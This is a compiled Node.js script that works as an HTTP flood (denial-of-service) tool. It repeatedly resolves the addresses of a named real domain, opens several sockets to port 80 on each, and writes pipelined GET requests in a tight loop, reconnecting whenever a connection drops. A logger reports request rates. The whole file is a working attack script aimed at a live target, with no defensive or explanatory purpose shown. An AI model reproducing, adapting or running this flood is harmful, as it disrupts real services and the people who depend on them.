"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
///@ts-ignore
const node_dig_dns_1 = __importDefault(require("node-dig-dns"));
const net_1 = __importDefault(require("net"));
class Target {
    constructor(ip, port) {
        this.socket = null;
        this.madeRequests = 0;
        this.ip = ip;
        this.port = port;
    }
    purge() {
        if (!this.socket) {
            return;
        }
        this.socket.destroy();
        this.socket = null;
        this.madeRequests = 0;
    }
}
let queue = new Set();
let ardessesSet = new Set();
let parallellRequestsForHost = 3;
console.log('hello');
// for (let i = 0; i < parallellRequestsForHost; i++) {
//     queue.add(new Target("127.0.0.1", 8557));
// }
doDig();
setInterval(() => {
    doDig();
}, 10000);
function doDig() {
    (0, node_dig_dns_1.default)(['@ns4.selectel.org', 'rshb-in.tech', '+short'])
        .then((result) => {
        let adresses = result.split('\n');
        for (let addr of adresses) {
            if (!ardessesSet.has(addr)) {
                console.log(addr);
                ardessesSet.add(addr);
                for (let i = 0; i < parallellRequestsForHost; i++) {
                    queue.add(new Target(addr, 80));
                }
            }
        }
    })
        .catch((err) => {
        console.log('Error:', err);
    });
}
let counter = 0;
let inProgress = 0;
let closes = 0;
let drains = 0;
let errors = 0;
let totalRequestsMade = 0;
let totalRequestsConfirmed = 0;
let text = "GET /get HTTP/1.1\r\n"
    // + "Accept-Encoding: br, gzip, deflate\r\n"
    + "X-Email-Id: busyrev@gmail.com\r\n\r\n";
setInterval(() => {
    let targets = [];
    for (let target of queue.values()) {
        targets.push(target);
    }
    for (let target of targets) {
        run(target);
    }
}, 10);
function run(target) {
    var socket = new net_1.default.Socket();
    target.socket = socket;
    queue.delete(target);
    socket.connect(target.port, target.ip, function () {
        // console.log('Connected ' + target.ip);
        fuckClient(target);
    });
    socket.on('data', function (data) {
        // console.log('Received: ' + data);
        let oks = data.toString().split("200").length - 1;
        totalRequestsConfirmed += oks;
        inProgress -= oks;
    });
    socket.on('drain', function () {
        // console.log('drain');
        drains++;
        fuckClient(target);
    });
    socket.on('close', function () {
        closes++;
        // console.log('Connection closed');
        target.purge();
        setTimeout(() => {
            queue.add(target);
        }, 500);
    });
    socket.on('error', function (err) {
        errors++;
        target.purge();
        setTimeout(() => {
            queue.add(target);
        }, 500);
    });
}
function fuckClient(target) {
    let writeResult = false;
    do {
        if (!target.socket) {
            setTimeout(() => {
                queue.add(target);
            }, 500);
            return;
        }
        inProgress++;
        counter++;
        totalRequestsMade++;
        writeResult = target.socket.write(text);
        target.madeRequests++;
        // if (target.madeRequests >= 30000) {
        //     target.socket?.destroy();
        //     target.madeRequests = 0;
        //     target.socket = null;
        //     queue.add(target);
        //     return;
        // }
    } while (writeResult == true);
    // console.log('writeResult: ' + writeResult);
}
setInterval(() => {
    let mem = process.memoryUsage();
    console.log('ops: ' + counter + ', inProgress: ' + inProgress, ', rss: ' + Math.round(mem.rss / (1024 * 1024)) + 'mb');
    console.log('closes: ' + closes + ', drains: ' + drains + ', errors: ' + errors, ' totalRequestsMade: ' + totalRequestsMade + ' totalRequestsConfirmed: ' + totalRequestsConfirmed + ' pid: ' + process.pid);
    closes = 0;
    drains = 0;
    errors = 0;
    counter = 0;
}, 1000);
//# sourceMappingURL=index.js.map